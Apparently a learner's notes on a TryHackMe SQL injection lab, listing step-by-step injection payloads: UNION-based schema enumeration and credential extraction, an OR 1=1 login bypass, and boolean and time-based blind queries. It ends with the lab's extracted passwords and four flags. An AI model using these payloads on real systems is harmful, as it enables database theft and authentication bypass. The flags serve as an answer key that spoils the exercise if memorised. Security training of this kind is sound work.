---
tags:
  - ctf
  - "#thm"
  - "#SQL_Injection"
  - "#union_sql_injection"
created: 2026-08-17
---

# `Error-Based SQL Injection` 
> 

## 🔐 Connection data

| Parameter | Value |
| --------- | ----- |
| Host      |       |
| Port      |       |
| Login     |       |
| Password  |       |

## 🎯 Task of the level
- 
## 🎯 Information

| Type of information             | Data                                                                     |
| ------------------------------- | ------------------------------------------------------------------------ |
| column count                    | 3                                                                        |
| displayed column                | 2 and 3                                                                  |
| database name                   | sqli_one                                                                 |
| enumerated tables               | article,staff_users                                                      |
| enumerated colums               | id,username,password                                                     |
| users authentification info     | ```<br>1:admin:p4ssword  <br>2:martin:pa$$word  <br>3:jim:work123<br>``` |
|                                 |                                                                          |
| level3 database name            | `sqli_three`                                                             |
| level3 table name               | `users`                                                                  |
| level3 column name              | username & password                                                      |
| level3 username                 | `admin`                                                                  |
| level3 password                 | 3845                                                                     |
|                                 |                                                                          |
| level4 database name            | `sqli_four`                                                              |
| level4 tables name              | `users`                                                                  |
| level4 admin login and password | `admin` `4961`                                                           |

## 🎯 Tools

| Tool | Destination | Usage |
| ---- | ----------- | ----- |
|      |             |       |
## 📚 Key commands/technics

| Coomand | Desctiption |
| ------- | ----------- |
|         |             |
|         |             |
|         |             |

## 💡 Step by step

| Step | Action                                                                                                                                                                                                                         | Information                     | Reason                                 |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------- | -------------------------------------- |
| 1    | 1 UNION SELECT 1                                                                                                                                                                                                               | trying UNION sql injection      | find what type of injection we can use |
| 2    | 0 UNION SELECT 1,2,3                                                                                                                                                                                                           | find which count we work with   | need to know, which column displayed   |
| 3    | 0 UNION SELECT 1,2,database()                                                                                                                                                                                                  | get database name               |                                        |
| 4    | 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'                                                                                                                     | enumerate tables                |                                        |
| 5    | 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'                                                                                                                  | enumerate columns               |                                        |
| 6    | 0 UNION SELECT 1,2,group_concat(id,':',username,':',password SEPARATOR '<br>') FROM staff_users                                                                                                                                | extract data from database      |                                        |
|      |                                                                                                                                                                                                                                |                                 |                                        |
| 1    | ' OR 1=1;--                                                                                                                                                                                                                    | bypass login                    |                                        |
|      |                                                                                                                                                                                                                                |                                 |                                        |
| 1    | `admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--`                                                                                                                                                                   | guess database name             |                                        |
| 2    | `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE '%';--`                                                              | get table name                  |                                        |
| 3    | `admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--`                                                                                                         | get column name                 |                                        |
| 4    | `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin';--`<br>`https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where password like '%';--` | get admin username and password |                                        |
|      |                                                                                                                                                                                                                                |                                 |                                        |
| 1    | `admin123' UNION SELECT SLEEP(5),2;--`                                                                                                                                                                                         | get column num                  |                                        |
| 2    | `admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four';-`                                                                                                                                                        | get database name               |                                        |
| 3    | `admin123' UNION SELECT SLEEP(1),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';`                                                                                               | get table name                  |                                        |
| 4    | `admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--`                                                                                                                              | getting admin password          |                                        |

## 🔍 Result
Flag1: `THM{SQL_INJECTION_3840}`
Flag2: `THM{SQL_INJECTION_9581}`
Flag3: `THM{SQL_INJECTION_1093}`
Flag4: `THM{SQL_INJECTION_MASTER}`

## 🚪 Travel
-> [tryhackme]
## 🔗 Link
- [Название ресурса](URL)